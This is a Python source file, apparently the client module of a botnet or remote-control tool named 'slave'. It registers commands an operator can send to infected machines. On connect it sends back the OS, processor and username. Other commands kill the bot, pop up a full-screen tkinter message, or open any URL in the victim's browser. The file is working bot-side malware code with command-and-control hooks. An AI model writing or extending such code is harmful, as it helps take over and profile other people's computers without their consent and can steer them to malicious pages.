from slave.lib.client import Bot
from typing import List
from tkinter import Tk, Label
from pathlib import Path
import platform
import time
import getpass
import webbrowser


BotBasic = Bot()


@BotBasic.register('quit', all=True, help_text="Kill bot -- Usage: $quit [/all | <bot_id>]")
def exit_server(bot: Bot, args: List[str]):
    bot.exit_server()


@BotBasic.register('info', all=True, help_text="Information of bot machine -- Usage: $info [/all | <bot_id>]", on_connect=True)
def sys_info(bot: Bot, args: List[str] = None):
    template = f"OS: {platform.system()} {platform.release()} -- Processor: {platform.processor()} \
-- Computer name: {getpass.getuser()}"
    bot.send_text(template)


@BotBasic.register('message', all=True, help_text="Message show with tkinter -- Usage: $message [/all | <bot_id>] <message> <msec>")
def show_msg_with_tk(bot: Bot, args: List[str]):
    win = Tk()
    win.title("Slave Message")
    win.resizable(False, False)
    lbl = Label(win, text=' '.join(args[1:-1]), font=('Aria Bold', 50))
    lbl.grid(column=0, row=0)
    sec = args[len(args) - 1]
    if not sec.isnumeric():
        bot.send_text("Command syntax error. Last argument must be millisecond")
        return 0
    if int(sec) != 0:
        win.after(sec, lambda: win.destroy())

    bot.send_text("Opening tkinter frame...")
    win.mainloop()


@BotBasic.register('visit', all=True, help_text="Open url with webbroser -- Usage: $visit [/all | <bot_id>] <url>")
def vist_url(bot: Bot, args: List[str]):
    bot.send_text(f"Opening page... {args[1]}")
    webbrowser.open(args[1])

@BotBasic.register('help', help_text="Help text of command -- Usage: $help <cmd>")
def helper(bot: Bot, args: List[str]):
    cmd_dict = bot.COMMAND_SET.get(args[1], None)
    if cmd_dict is not None:
        bot.send_text(cmd_dict['help_text'])
    elif args[1] == '/all':
        bot.send_command_help()
    else:
        bot.send_text("Command not found")